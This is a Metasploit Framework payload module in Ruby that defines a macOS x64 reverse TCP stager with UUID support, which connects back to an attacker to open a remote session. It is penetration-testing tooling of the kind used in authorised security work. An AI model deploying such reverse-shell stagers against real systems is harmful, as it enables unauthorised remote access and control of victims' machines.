##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/osx/x64/reverse_tcp'

module MetasploitModule

  CachedSize = 204

  include Msf::Payload::Osx::ReverseTcp_x64
  include Msf::Payload::TransportConfig
  include Msf::Payload::Stager

  def self.handler_type_alias
    'reverse_tcp_uuid'
  end

  def initialize(info = { })
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager with UUID Support (OSX x64)',
      'Description' => 'Connect back to the attacker with UUID Support (OSX x64)',
      'Author'      => 'timwr',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => { 'RequiresMidstager' => true },
      'Convention'  => 'sockedi',
    ))
  end

  def include_send_uuid
    true
  end

  def generate(opts = {})
    generate_reverse_tcp(opts)
  end

end
